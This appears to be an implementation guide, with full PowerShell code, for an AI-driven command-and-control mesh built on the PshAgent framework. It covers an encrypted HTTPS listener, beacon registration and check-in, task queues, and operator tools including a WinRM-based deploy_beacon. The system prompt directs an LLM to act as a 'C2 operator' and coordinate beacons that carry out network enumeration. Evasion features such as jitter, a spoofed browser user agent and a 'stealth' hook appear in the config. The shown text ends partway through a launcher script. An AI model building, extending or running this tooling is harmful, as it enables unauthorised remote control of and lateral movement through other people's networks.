# C2 Agent Mesh — Implementation Guide

> Complete implementation spec for building a C2 agent mesh on top of PshAgent.
> Module path: `c2-mesh/` at repo root. Zero modifications to `PshAgent/`.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Module Structure](#2-module-structure)
3. [Phase 1: Foundation](#3-phase-1-foundation)
4. [Phase 2: Controller](#4-phase-2-controller)
5. [Phase 3: Beacon Core](#5-phase-3-beacon-core)
6. [Phase 4: Mesh](#6-phase-4-mesh)
7. [Phase 5: Dashboard (Elixir/Phoenix)](#7-phase-5-dashboard-elixirphoenix)
8. [Phase 6: Cloudflare Redirector](#8-phase-6-cloudflare-redirector)
9. [Verification Steps](#9-verification-steps)
10. [PshAgent API Reference](#10-pshagent-api-reference)

---

## 1. Architecture Overview

### Component Diagram

```
┌─────────────────────────────────────────────────────────┐
│                    OPERATOR (Human)                       │
│                                                           │
│  Start-PshAgent w/ controller tools                      │
│  "Deploy beacon to 10.0.1.5" → AI routes to tools       │
└────────────────┬──────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│              CONTROLLER (PshAgent + HttpListener)         │
│                                                           │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────┐  │
│  │ Beacon       │  │ Task Queue   │  │ Operator      │  │
│  │ Registry     │  │ (per-beacon) │  │ Tools (×5)    │  │
│  │ (ConcDict)   │  │              │  │               │  │
│  └──────┬───────┘  └──────┬───────┘  └───────┬───────┘  │
│         │                 │                   │          │
│         └─────────┬───────┘                   │          │
│                   ▼                           │          │
│  ┌──────────────────────────────┐             │          │
│  │ HTTP Listener (:8443 TLS)   │◄────────────┘          │
│  │ /register  /checkin  /task  │                         │
│  └──────────────┬──────────────┘                         │
└─────────────────┼────────────────────────────────────────┘
                  │ HTTPS
                  ▼
┌─────────────────────────────────────────────────────────┐
│              BEACON (PshAgent polling loop)               │
│                                                           │
│  ┌───────────┐  ┌─────────────┐  ┌────────────────────┐ │
│  │ Check-in  │  │ Beacon      │  │ AI Agent           │ │
│  │ Loop      │  │ Hooks (×4)  │  │ (tool execution)   │ │
│  └─────┬─────┘  └──────┬──────┘  └────────┬───────────┘ │
│        │               │                   │             │
│        │    ┌──────────────────────────┐    │             │
│        └───►│ PshAgent Built-in Tools  │◄───┘             │
│             │ run_command, read_file,  │                  │
│             │ write_file, list_dir,    │                  │
│             │ search_files, grep       │                  │
│             │ + port_scan (custom)     │                  │
│             └──────────────────────────┘                  │
└──────────────────────────────────────────────────────────┘
                  │
                  ▼ (Phase 4)
┌─────────────────────────────────────────────────────────┐
│                    MESH LAYER                             │
│                                                           │
│  Beacon ←──relay──► Beacon ←──relay──► Beacon            │
│  Mesh discovery, swarm tasking, multi-hop relay          │
└──────────────────────────────────────────────────────────┘
```

### PshAgent Mapping

| C2 Concept | PshAgent Abstraction | Notes |
|---|---|---|
| Operator CLI | `Start-PshAgent` with custom tools | Interactive REPL, AI-driven |
| Controller | Background runspace + `HttpListener` | Not an agent itself — infrastructure |
| Operator commands | `New-Tool` (×5) | list_beacons, task_beacon, get_results, deploy_beacon, kill_beacon |
| Beacon AI brain | `New-Agent` + `Invoke-Agent` | Executes tasks from controller |
| Beacon tools | PshAgent built-ins + `port_scan` | `run_command`, `read_file`, `write_file`, `list_directory`, `search_files`, `grep` — Claude reasons about tradecraft |
| Beacon hooks | `New-Hook` (×4) | telemetry, check-in, kill switch, stealth |
| Beacon stop | `StopCondition` | Kill switch or max-steps |
| Sub-agents | `New-SubAgentTool` | For complex multi-step beacon tasks |
| Mesh relay | `New-Tool` wrapping HTTP forwarding | Beacon-to-beacon relay |
| Comms encryption | `AesGcm` (.NET) | Wraps all HTTP payloads |

### Data Flow

```
Operator types: "scan 10.0.1.0/24 from beacon-alpha"
  → PshAgent AI selects tool: task_beacon(beaconId='alpha', task='scan 10.0.1.0/24')
    → Controller queues task for beacon-alpha
      → Beacon-alpha checks in, receives task
        → Beacon creates PshAgent with built-in tools, runs Invoke-Agent
          → Claude decides which tools to use (run_command, read_file, port_scan, etc.)
            → Results flow back: tool output → check-in response → Controller → Operator
```

---

## 2. Module Structure

```
c2-mesh/
├── c2-mesh.psd1                    # Module manifest
├── c2-mesh.psm1                    # Module loader (dot-sources everything)
├── Config/
│   └── c2-config.ps1               # Constants, defaults, paths
├── Crypto/
│   └── Invoke-C2Crypto.ps1         # AES-256-GCM encrypt/decrypt
├── Controller/
│   ├── Start-C2Listener.ps1        # HttpListener in background runspace
│   ├── Get-BeaconRegistry.ps1      # ConcurrentDictionary management
│   ├── Send-BeaconTask.ps1         # Queue task for a beacon
│   ├── Get-BeaconResults.ps1       # Retrieve results from a beacon
│   ├── New-OperatorTools.ps1       # 5 operator tools (PshAgentTool[])
│   └── Start-C2Controller.ps1      # Compose & launch controller
├── Beacon/
│   ├── Register-Beacon.ps1         # POST /register on startup
│   ├── Invoke-CheckIn.ps1          # POST /checkin (poll for tasks)
│   ├── New-BeaconHooks.ps1         # 4 hooks (telemetry, checkin, kill, stealth)
│   ├── New-PortScanTool.ps1        # port_scan (only custom tool — rest are PshAgent built-ins)
│   └── Start-C2Beacon.ps1          # Compose & launch beacon polling loop
├── Mesh/
│   ├── New-MeshRelayTool.ps1       # Relay tasks through peer beacons
│   ├── Invoke-MeshDiscovery.ps1    # Discover peer beacons on network
│   └── Invoke-SwarmTask.ps1        # Distribute task across mesh
└── Launchers/
    ├── start-controller.ps1        # Script entry point for controller
    └── start-beacon.ps1            # Script entry point for beacon
```

---

## 3. Phase 1: Foundation

### 3.1 `Config/c2-config.ps1`

```powershell
# C2 Mesh Configuration — constants and defaults

$script:C2Config = @{
    # Controller
    ListenPort       = 8443
    ListenPrefix     = 'https://+:8443/'
    CertThumbprint   = $null  # Set at runtime or use self-signed

    # Beacon defaults
    CheckInInterval  = 30          # seconds between check-ins
    Jitter           = 0.2         # ±20% randomization on interval
    MaxMissedCheckins = 5          # mark beacon dead after N misses
    BeaconUserAgent  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    # Crypto
    KeyDerivation    = 'HKDF-SHA256'
    NonceBytes       = 12
    TagBytes         = 16

    # Paths
    SessionDir       = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.c2-mesh' 'sessions'
    LogDir           = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.c2-mesh' 'logs'

    # Agent defaults
    ConnectionString = 'anthropic/claude-sonnet-4-20250514'
    MaxAgentSteps    = 15
    BeaconMaxSteps   = 10

    # Mesh
    MeshPort         = 9443
    RelayTTL         = 3           # max hops for relay
}

# Ensure dirs exist
@($script:C2Config.SessionDir, $script:C2Config.LogDir) | ForEach-Object {
    if (-not (Test-Path $_)) { New-Item -ItemType Directory -Path $_ -Force | Out-Null }
}
```

### 3.2 `Crypto/Invoke-C2Crypto.ps1`

Uses `System.Security.Cryptography.AesGcm` (available in .NET 6+ / PowerShell 7+).

```powershell
function Invoke-C2Encrypt {
    <#
    .SYNOPSIS
    AES-256-GCM encrypt. Returns base64 string: nonce + ciphertext + tag.
    .PARAMETER Plaintext
    String to encrypt
    .PARAMETER Key
    32-byte key (base64 string or byte array)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Plaintext,

        [Parameter(Mandatory)]
        $Key
    )

    $keyBytes = if ($Key -is [byte[]]) { $Key } else { [Convert]::FromBase64String($Key) }
    if ($keyBytes.Length -ne 32) { throw "Key must be 32 bytes (AES-256)" }

    $nonceLen = $script:C2Config.NonceBytes
    $tagLen   = $script:C2Config.TagBytes

    $plaintextBytes = [System.Text.Encoding]::UTF8.GetBytes($Plaintext)
    $nonce          = [byte[]]::new($nonceLen)
    $tag            = [byte[]]::new($tagLen)
    $ciphertext     = [byte[]]::new($plaintextBytes.Length)

    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)

    $aes = [System.Security.Cryptography.AesGcm]::new($keyBytes, $tagLen)
    try {
        $aes.Encrypt($nonce, $plaintextBytes, $ciphertext, $tag)
    }
    finally {
        $aes.Dispose()
    }

    # Pack: nonce + ciphertext + tag
    $packed = [byte[]]::new($nonceLen + $ciphertext.Length + $tagLen)
    [Buffer]::BlockCopy($nonce, 0, $packed, 0, $nonceLen)
    [Buffer]::BlockCopy($ciphertext, 0, $packed, $nonceLen, $ciphertext.Length)
    [Buffer]::BlockCopy($tag, 0, $packed, $nonceLen + $ciphertext.Length, $tagLen)

    return [Convert]::ToBase64String($packed)
}

function Invoke-C2Decrypt {
    <#
    .SYNOPSIS
    AES-256-GCM decrypt. Takes base64 string (nonce + ciphertext + tag).
    .PARAMETER CipherText
    Base64-encoded packed data
    .PARAMETER Key
    32-byte key (base64 string or byte array)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CipherText,

        [Parameter(Mandatory)]
        $Key
    )

    $keyBytes = if ($Key -is [byte[]]) { $Key } else { [Convert]::FromBase64String($Key) }
    if ($keyBytes.Length -ne 32) { throw "Key must be 32 bytes (AES-256)" }

    $nonceLen = $script:C2Config.NonceBytes
    $tagLen   = $script:C2Config.TagBytes

    $packed     = [Convert]::FromBase64String($CipherText)
    $cipherLen  = $packed.Length - $nonceLen - $tagLen

    if ($cipherLen -lt 0) { throw "Invalid ciphertext: too short" }

    $nonce      = [byte[]]::new($nonceLen)
    $cipher     = [byte[]]::new($cipherLen)
    $tag        = [byte[]]::new($tagLen)
    $plaintext  = [byte[]]::new($cipherLen)

    [Buffer]::BlockCopy($packed, 0, $nonce, 0, $nonceLen)
    [Buffer]::BlockCopy($packed, $nonceLen, $cipher, 0, $cipherLen)
    [Buffer]::BlockCopy($packed, $nonceLen + $cipherLen, $tag, 0, $tagLen)

    $aes = [System.Security.Cryptography.AesGcm]::new($keyBytes, $tagLen)
    try {
        $aes.Decrypt($nonce, $cipher, $tag, $plaintext)
    }
    finally {
        $aes.Dispose()
    }

    return [System.Text.Encoding]::UTF8.GetString($plaintext)
}

function New-C2Key {
    <#
    .SYNOPSIS
    Generate a random 32-byte AES-256 key. Returns base64 string.
    #>
    [CmdletBinding()]
    param()

    $key = [byte[]]::new(32)
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($key)
    return [Convert]::ToBase64String($key)
}
```

### 3.3 `c2-mesh.psd1`

```powershell
@{
    RootModule        = 'c2-mesh.psm1'
    ModuleVersion     = '0.1.0'
    GUID              = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890'
    Author            = 'C2 Mesh'
    Description       = 'C2 Agent Mesh built on PshAgent'
    PowerShellVersion = '7.0'
    RequiredModules   = @(
        @{ ModuleName = '../PshAgent/PshAgent.psd1'; ModuleVersion = '0.1.0' }
    )
    FunctionsToExport = @(
        # Crypto
        'Invoke-C2Encrypt'
        'Invoke-C2Decrypt'
        'New-C2Key'
        # Controller
        'Start-C2Listener'
        'Stop-C2Listener'
        'Get-BeaconRegistry'
        'Send-BeaconTask'
        'Get-BeaconResults'
        'New-OperatorTools'
        'Start-C2Controller'
        # Beacon
        'Register-Beacon'
        'Invoke-CheckIn'
        'New-BeaconHooks'
        'New-PortScanTool'
        'Start-C2Beacon'
        # Mesh
        'New-MeshRelayTool'
        'Invoke-MeshDiscovery'
        'Invoke-SwarmTask'
    )
}
```

### 3.4 `c2-mesh.psm1`

```powershell
# C2 Mesh Module Loader
# Dot-source in dependency order: Config → Crypto → Controller → Beacon → Mesh

$scriptRoot = $PSScriptRoot

# Config (must be first — everything reads $script:C2Config)
. "$scriptRoot/Config/c2-config.ps1"

# Crypto
. "$scriptRoot/Crypto/Invoke-C2Crypto.ps1"

# Controller
. "$scriptRoot/Controller/Start-C2Listener.ps1"
. "$scriptRoot/Controller/Get-BeaconRegistry.ps1"
. "$scriptRoot/Controller/Send-BeaconTask.ps1"
. "$scriptRoot/Controller/Get-BeaconResults.ps1"
. "$scriptRoot/Controller/New-OperatorTools.ps1"
. "$scriptRoot/Controller/Start-C2Controller.ps1"

# Beacon
. "$scriptRoot/Beacon/Register-Beacon.ps1"
. "$scriptRoot/Beacon/Invoke-CheckIn.ps1"
. "$scriptRoot/Beacon/New-BeaconHooks.ps1"
. "$scriptRoot/Beacon/New-PortScanTool.ps1"
. "$scriptRoot/Beacon/Start-C2Beacon.ps1"

# Mesh (Phase 4)
. "$scriptRoot/Mesh/New-MeshRelayTool.ps1"
. "$scriptRoot/Mesh/Invoke-MeshDiscovery.ps1"
. "$scriptRoot/Mesh/Invoke-SwarmTask.ps1"

Export-ModuleMember -Function @(
    'Invoke-C2Encrypt', 'Invoke-C2Decrypt', 'New-C2Key',
    'Start-C2Listener', 'Stop-C2Listener',
    'Get-BeaconRegistry', 'Send-BeaconTask', 'Get-BeaconResults',
    'New-OperatorTools', 'Start-C2Controller',
    'Register-Beacon', 'Invoke-CheckIn',
    'New-BeaconHooks', 'New-PortScanTool', 'Start-C2Beacon',
    'New-MeshRelayTool', 'Invoke-MeshDiscovery', 'Invoke-SwarmTask'
)
```

---

## 4. Phase 2: Controller

### 4.1 `Controller/Start-C2Listener.ps1`

HTTP listener runs in a background runspace. Routes:
- `POST /register` — beacon registration
- `POST /checkin` — beacon check-in (returns queued tasks)
- `POST /task` — direct task submission (internal)

```powershell
function Start-C2Listener {
    <#
    .SYNOPSIS
    Start HTTPS listener in a background runspace. Returns listener state hashtable.
    .PARAMETER Port
    Listen port (default from C2Config)
    .PARAMETER Key
    Shared AES-256 key (base64) for payload encryption
    .PARAMETER Registry
    ConcurrentDictionary for beacon state (from Get-BeaconRegistry)
    .PARAMETER TaskQueues
    ConcurrentDictionary of per-beacon task queues
    .PARAMETER ResultStore
    ConcurrentDictionary of per-beacon result lists
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [int]$Port = $script:C2Config.ListenPort,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]$Registry,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]$ResultStore
    )

    $prefix = "https://+:${Port}/"

    # Shared state passed into the runspace
    $sharedState = [hashtable]::Synchronized(@{
        Running     = $true
        Key         = $Key
        Registry    = $Registry
        TaskQueues  = $TaskQueues
        ResultStore = $ResultStore
        Config      = $script:C2Config
        Errors      = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    })

    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $runspace.SessionStateProxy.SetVariable('state', $sharedState)
    $runspace.SessionStateProxy.SetVariable('prefix', $prefix)

    # Import crypto functions into runspace
    $cryptoScript = Get-Content "$PSScriptRoot/../Crypto/Invoke-C2Crypto.ps1" -Raw
    $configScript = Get-Content "$PSScriptRoot/../Config/c2-config.ps1" -Raw

    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    $null = $ps.AddScript({
        param($cryptoSrc, $configSrc)

        # Load config and crypto into this runspace
        Invoke-Expression $configSrc
        Invoke-Expression $cryptoSrc

        $listener = [System.Net.HttpListener]::new()
        $listener.Prefixes.Add($prefix)
        $listener.Start()

        try {
            while ($state.Running) {
                # Async wait with timeout so we can check Running flag
                $ctxTask = $listener.GetContextAsync()
                while (-not $ctxTask.Wait(1000)) {
                    if (-not $state.Running) { return }
                }
                $ctx = $ctxTask.Result
                $req = $ctx.Request
                $resp = $ctx.Response

                try {
                    $path = $req.Url.AbsolutePath
                    $body = $null
                    if ($req.HasEntityBody) {
                        $reader = [System.IO.StreamReader]::new($req.InputStream)
                        $rawBody = $reader.ReadToEnd()
                        $reader.Close()

                        # Decrypt
                        $json = Invoke-C2Decrypt -CipherText $rawBody -Key $state.Key
                        $body = $json | ConvertFrom-Json -AsHashtable
                    }

                    $result = @{ status = 'error'; message = 'unknown route' }

                    switch ($path) {
                        '/register' {
                            # Body: { beaconId, hostname, username, os, ip, pid }
                            $bid = $body.beaconId
                            $entry = @{
                                beaconId    = $bid
                                hostname    = $body.hostname
                                username    = $body.username
                                os          = $body.os
                                ip          = $body.ip
                                pid         = $body.pid
                                firstSeen   = [datetime]::UtcNow
                                lastCheckin = [datetime]::UtcNow
                                alive       = $true
                                missedCount = 0
                            }
                            $null = $state.Registry.AddOrUpdate($bid, $entry, { param($k, $v) $entry })

                            # Ensure queues exist
                            $null = $state.TaskQueues.GetOrAdd($bid, {
                                [System.Collections.Concurrent.ConcurrentQueue[hashtable]]::new()
                            }.Invoke()[0])
                            $null = $state.ResultStore.GetOrAdd($bid, {
                                [System.Collections.Concurrent.ConcurrentBag[hashtable]]::new()
                            }.Invoke()[0])

                            $result = @{ status = 'registered'; beaconId = $bid }
                        }

                        '/checkin' {
                            # Body: { beaconId, results (optional array) }
                            $bid = $body.beaconId

                            # Update last checkin
                            $existing = $null
                            if ($state.Registry.TryGetValue($bid, [ref]$existing)) {
                                $existing.lastCheckin = [datetime]::UtcNow
                                $existing.missedCount = 0
                                $existing.alive = $true
                            }

                            # Store any results the beacon sent back
                            if ($body.results) {
                                $bag = $null
                                if ($state.ResultStore.TryGetValue($bid, [ref]$bag)) {
                                    foreach ($r in $body.results) {
                                        $bag.Add(@{
                                            taskId    = $r.taskId
                                            output    = $r.output
                                            status    = $r.status
                                            timestamp = [datetime]::UtcNow
                                        })
                                    }
                                }
                            }

                            # Dequeue pending tasks
                            $tasks = @()
                            $queue = $null
                            if ($state.TaskQueues.TryGetValue($bid, [ref]$queue)) {
                                $task = $null
                                while ($queue.TryDequeue([ref]$task)) {
                                    $tasks += $task
                                }
                            }

                            $result = @{ status = 'ok'; tasks = $tasks }
                        }
                    }

                    # Encrypt response
                    $respJson = $result | ConvertTo-Json -Depth 10 -Compress
                    $encrypted = Invoke-C2Encrypt -Plaintext $respJson -Key $state.Key
                    $respBytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)

                    $resp.StatusCode = 200
                    $resp.ContentType = 'application/octet-stream'
                    $resp.ContentLength64 = $respBytes.Length
                    $resp.OutputStream.Write($respBytes, 0, $respBytes.Length)
                }
                catch {
                    $state.Errors.Add("Listener error: $_")
                    $resp.StatusCode = 500
                }
                finally {
                    $resp.Close()
                }
            }
        }
        finally {
            $listener.Stop()
            $listener.Close()
        }
    }).AddArgument($cryptoScript).AddArgument($configScript)

    $handle = $ps.BeginInvoke()

    return @{
        PowerShell  = $ps
        Handle      = $handle
        Runspace    = $runspace
        SharedState = $sharedState
        Port        = $Port
    }
}

function Stop-C2Listener {
    <#
    .SYNOPSIS
    Stop the background HTTP listener
    .PARAMETER ListenerState
    State hashtable returned by Start-C2Listener
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [hashtable]$ListenerState
    )

    $ListenerState.SharedState.Running = $false
    $ListenerState.PowerShell.EndInvoke($ListenerState.Handle)
    $ListenerState.PowerShell.Dispose()
    $ListenerState.Runspace.Close()
    $ListenerState.Runspace.Dispose()
}
```

### 4.2 `Controller/Get-BeaconRegistry.ps1`

```powershell
function Get-BeaconRegistry {
    <#
    .SYNOPSIS
    Create or return the shared beacon registry and associated stores.
    Returns @{ Registry; TaskQueues; ResultStore }
    #>
    [CmdletBinding()]
    param()

    return @{
        Registry    = [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]::new()
        TaskQueues  = [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]::new()
        ResultStore = [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]::new()
    }
}
```

### 4.3 `Controller/Send-BeaconTask.ps1`

```powershell
function Send-BeaconTask {
    <#
    .SYNOPSIS
    Queue a task for a specific beacon
    .PARAMETER BeaconId
    Target beacon ID
    .PARAMETER Task
    Task string (natural language instruction for the beacon AI)
    .PARAMETER TaskQueues
    ConcurrentDictionary of per-beacon task queues
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter(Mandatory)]
        [string]$Task,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues
    )

    $queue = $null
    if (-not $TaskQueues.TryGetValue($BeaconId, [ref]$queue)) {
        $queue = [System.Collections.Concurrent.ConcurrentQueue[hashtable]]::new()
        $queue = $TaskQueues.GetOrAdd($BeaconId, $queue)
    }

    $taskObj = @{
        taskId    = [guid]::NewGuid().ToString('N').Substring(0, 8)
        task      = $Task
        timestamp = [datetime]::UtcNow.ToString('o')
    }

    $queue.Enqueue($taskObj)
    return $taskObj
}
```

### 4.4 `Controller/Get-BeaconResults.ps1`

```powershell
function Get-BeaconResults {
    <#
    .SYNOPSIS
    Retrieve results from a specific beacon
    .PARAMETER BeaconId
    Target beacon ID
    .PARAMETER ResultStore
    ConcurrentDictionary of per-beacon result bags
    .PARAMETER TaskId
    Optional: filter to specific task ID
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]$ResultStore,

        [Parameter()]
        [string]$TaskId
    )

    $bag = $null
    if (-not $ResultStore.TryGetValue($BeaconId, [ref]$bag)) {
        return @()
    }

    $results = @($bag.ToArray())

    if ($TaskId) {
        $results = @($results | Where-Object { $_.taskId -eq $TaskId })
    }

    return $results | Sort-Object { $_.timestamp }
}
```

### 4.5 `Controller/New-OperatorTools.ps1`

Five tools the operator's AI agent uses to manage the C2:

```powershell
function New-OperatorTools {
    <#
    .SYNOPSIS
    Create the 5 operator tools for controlling the C2.
    Returns PshAgentTool[] array.
    .PARAMETER Stores
    Hashtable from Get-BeaconRegistry: @{ Registry; TaskQueues; ResultStore }
    .PARAMETER Key
    Shared encryption key
    .PARAMETER ControllerUrl
    Base URL of the controller (for deploy_beacon)
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool[]])]
    param(
        [Parameter(Mandatory)]
        [hashtable]$Stores,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$ControllerUrl
    )

    $registry   = $Stores.Registry
    $taskQueues = $Stores.TaskQueues
    $resultStore = $Stores.ResultStore
    $ctrlUrl    = $ControllerUrl
    $sharedKey  = $Key

    # 1. list_beacons
    $listBeacons = New-Tool -Name 'list_beacons' `
        -Description 'List all registered beacons with their status, hostname, IP, last check-in time, and alive status.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                alive_only = @{
                    type        = 'boolean'
                    description = 'If true, only return beacons marked alive (default: false)'
                }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $beacons = @()
            foreach ($entry in $registry.GetEnumerator()) {
                $b = $entry.Value
                if ($a.alive_only -and -not $b.alive) { continue }
                $beacons += @{
                    beaconId    = $b.beaconId
                    hostname    = $b.hostname
                    username    = $b.username
                    ip          = $b.ip
                    os          = $b.os
                    pid         = $b.pid
                    alive       = $b.alive
                    lastCheckin = $b.lastCheckin.ToString('o')
                    firstSeen   = $b.firstSeen.ToString('o')
                }
            }
            $beacons | ConvertTo-Json -Depth 5
        }.GetNewClosure()

    # 2. task_beacon
    $taskBeacon = New-Tool -Name 'task_beacon' `
        -Description 'Send a task (natural language instruction) to a specific beacon. The beacon AI will interpret and execute it using its available tools.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                beacon_id = @{ type = 'string'; description = 'Target beacon ID' }
                task      = @{ type = 'string'; description = 'Natural language task for the beacon AI to execute' }
            }
            required   = @('beacon_id', 'task')
        } `
        -Execute {
            param($a)
            $taskObj = Send-BeaconTask -BeaconId $a.beacon_id -Task $a.task -TaskQueues $taskQueues
            "Task queued: $($taskObj | ConvertTo-Json -Compress)"
        }.GetNewClosure()

    # 3. get_results
    $getResults = New-Tool -Name 'get_results' `
        -Description 'Retrieve results from a beacon. Optionally filter by task ID.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                beacon_id = @{ type = 'string'; description = 'Beacon ID to get results from' }
                task_id   = @{ type = 'string'; description = 'Optional: specific task ID to filter by' }
            }
            required   = @('beacon_id')
        } `
        -Execute {
            param($a)
            $results = Get-BeaconResults -BeaconId $a.beacon_id -ResultStore $resultStore -TaskId $a.task_id
            if ($results.Count -eq 0) { 'No results yet.' }
            else { $results | ConvertTo-Json -Depth 5 }
        }.GetNewClosure()

    # 4. deploy_beacon
    $deployBeacon = New-Tool -Name 'deploy_beacon' `
        -Description 'Deploy a new beacon to a target host via PowerShell remoting (WinRM). Requires credentials or existing PSSession access.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                target_host = @{ type = 'string'; description = 'Target hostname or IP' }
                username    = @{ type = 'string'; description = 'Username for authentication' }
                password    = @{ type = 'string'; description = 'Password for authentication' }
                beacon_id   = @{ type = 'string'; description = 'Optional: custom beacon ID (auto-generated if omitted)' }
            }
            required   = @('target_host')
        } `
        -Execute {
            param($a)
            $bid = if ($a.beacon_id) { $a.beacon_id } else { 'beacon-' + [guid]::NewGuid().ToString('N').Substring(0, 6) }
            $target = $a.target_host

            # Build the beacon launch script to run on remote host
            $launchScript = @"
`$ErrorActionPreference = 'Stop'
# Download/copy beacon module and start
# In production this would pull the module from a staging server
# For now, assume the module is available at a known path
Start-C2Beacon -ControllerUrl '$ctrlUrl' -Key '$sharedKey' -BeaconId '$bid'
"@
            try {
                if ($a.username -and $a.password) {
                    $secPass = ConvertTo-SecureString $a.password -AsPlainText -Force
                    $cred = [PSCredential]::new($a.username, $secPass)
                    Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {
                        param($script) Invoke-Expression $script
                    } -ArgumentList $launchScript
                }
                else {
                    Invoke-Command -ComputerName $target -ScriptBlock {
                        param($script) Invoke-Expression $script
                    } -ArgumentList $launchScript
                }
                "Beacon '$bid' deployment initiated on $target"
            }
            catch {
                "Deploy failed: $_"
            }
        }.GetNewClosure()

    # 5. kill_beacon
    $killBeacon = New-Tool -Name 'kill_beacon' `
        -Description 'Send a kill signal to a beacon. It will terminate on next check-in.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                beacon_id = @{ type = 'string'; description = 'Beacon ID to kill' }
            }
            required   = @('beacon_id')
        } `
        -Execute {
            param($a)
            # Queue a special __kill__ task
            $taskObj = Send-BeaconTask -BeaconId $a.beacon_id -Task '__kill__' -TaskQueues $taskQueues
            # Mark as dead in registry
            $existing = $null
            if ($registry.TryGetValue($a.beacon_id, [ref]$existing)) {
                $existing.alive = $false
            }
            "Kill signal queued for beacon '$($a.beacon_id)'"
        }.GetNewClosure()

    return @($listBeacons, $taskBeacon, $getResults, $deployBeacon, $killBeacon)
}
```

### 4.6 `Controller/Start-C2Controller.ps1`

Composes all controller components and launches the operator CLI.

```powershell
function Start-C2Controller {
    <#
    .SYNOPSIS
    Start the C2 controller: HTTP listener + operator CLI with PshAgent.
    .PARAMETER ConnectionString
    LLM connection string for the operator agent (default from C2Config)
    .PARAMETER Port
    Listen port (default from C2Config)
    .PARAMETER Key
    Shared encryption key. If not provided, generates a new one and displays it.
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [string]$ConnectionString = $script:C2Config.ConnectionString,

        [Parameter()]
        [int]$Port = $script:C2Config.ListenPort,

        [Parameter()]
        [string]$Key
    )

    # Generate key if not provided
    if (-not $Key) {
        $Key = New-C2Key
        Write-Host "[*] Generated shared key: $Key" -ForegroundColor Yellow
        Write-Host "[*] Use this key when starting beacons." -ForegroundColor Yellow
    }

    # Create registry stores
    $stores = Get-BeaconRegistry

    # Start HTTP listener
    Write-Host "[*] Starting listener on port $Port..." -ForegroundColor Cyan
    $listenerState = Start-C2Listener -Port $Port -Key $Key `
        -Registry $stores.Registry `
        -TaskQueues $stores.TaskQueues `
        -ResultStore $stores.ResultStore

    Write-Host "[+] Listener started on https://+:${Port}/" -ForegroundColor Green

    $controllerUrl = "https://localhost:${Port}"

    # Create operator tools
    $operatorTools = New-OperatorTools -Stores $stores -Key $Key -ControllerUrl $controllerUrl

    # Build operator system prompt
    $systemPrompt = @"
You are a C2 operator AI assistant. You manage a network of AI-powered beacons through the following tools:

- list_beacons: See all registered beacons and their status
- task_beacon: Send a natural language task to a beacon for autonomous execution
- get_results: Retrieve results from beacon task execution
- deploy_beacon: Deploy a new beacon to a target host
- kill_beacon: Terminate a beacon

When the operator gives you high-level objectives (e.g., "enumerate the internal network"),
break them down into specific beacon tasks and coordinate across multiple beacons.

Always check beacon status before tasking. Wait for results before proceeding to dependent tasks.
Report findings clearly and suggest next steps.
"@

    # Launch operator CLI via Start-PshAgent
    try {
        Start-PshAgent -ConnectionString $ConnectionString `
            -SystemPrompt $systemPrompt `
            -Tools $operatorTools `
            -MaxSteps $script:C2Config.MaxAgentSteps
    }
    finally {
        # Clean up listener when operator exits
        Write-Host "`n[*] Shutting down listener..." -ForegroundColor Yellow
        Stop-C2Listener -ListenerState $listenerState
        Write-Host "[+] Controller stopped." -ForegroundColor Green
    }
}
```

### 4.7 `Launchers/start-controller.ps1`

```powershell
#!/usr/bin/env pwsh
<#
.SYNOPSIS
Entry point script for starting the C2 controller.
.EXAMPLE
./start-controller.ps1
./start-controller.ps1 -Key 'base64key==' -Port 9443
./start-controller.ps1 -ConnectionString 'openai/gpt-4o'
#>
[CmdletBinding()]
param(
    [Parameter()]
    [string]$ConnectionString,

    [Parameter()]
    [int]$Port,

    [Parameter()]
    [string]$Key
)

$ErrorActionPreference = 'Stop'

# Import modules
$scriptDir = $PSScriptRoot
